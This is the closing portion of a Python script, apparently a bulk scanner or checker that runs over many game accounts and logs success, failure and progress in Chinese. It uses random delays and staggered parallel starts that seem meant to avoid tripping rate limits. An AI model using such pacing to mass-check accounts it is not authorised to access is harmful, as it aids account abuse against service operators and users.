                log(f"[{idx}/{total}] ✗ 失败  {user}   {_why}   {dt:.0f} 秒")
                fw.writerow([user, status, time.strftime("%Y-%m-%d %H:%M:%S")])
                fail.flush()
                stat["fail"] += 1
            with io.open(prog_path, "a", encoding="utf-8") as pf:
                pf.write(json.dumps({"account": user, "status": status,
                                     "found": found, "games": gused,
                                     "ts": int(time.time())},
                                    ensure_ascii=False) + "\n")
            n = stat["ok"] + stat["fail"]
            if n % 10 == 0 or n == total:
                el = time.time() - t_start
                eta = (el / n) * (total - n) if n else 0
                log(f"    —— 进度 {n}/{total}  已用 {el/60:.1f} 分  "
                    f"预计剩余 {eta/60:.1f} 分  （成功 {stat['ok']} 失败 {stat['fail']}）")

    if args.parallel <= 1:
        for i, item in enumerate(todo, 1):
            if STOP_EVENT.is_set():
                log("[停止] 收到停止指令，中断本轮")
                break
            run_one(i, item)
            if i < total and not STOP_EVENT.is_set():
                time.sleep(random.uniform(args.acct_delay * 0.7, args.acct_delay * 1.4))
    else:
        log(f"[并行] {args.parallel} 个账号同时跑，每个账号内部仍限速 {args.rate}s/请求")
        # 错开启动，避免同一瞬间一起打
        def staggered(i_item):
            i, item = i_item
            time.sleep(random.uniform(0, args.acct_delay * args.parallel))
            if STOP_EVENT.is_set():
                return
            run_one(i, item)
        with ThreadPoolExecutor(max_workers=args.parallel) as ex:
            list(ex.map(staggered, list(enumerate(todo, 1))))

    log(f"\n===== 完成：成功 {stat['ok']} / 失败 {stat['fail']} / "
        f"跳过 {len(accts)-total} =====")
    log(f"结果 {args.out}   进度 {prog_path}   失败 fail.csv")
    out.close(); fail.close()
    netguard.report()
    return 0


def main():
    return run_scan(build_parser().parse_args())


if __name__ == "__main__":
    sys.exit(main())
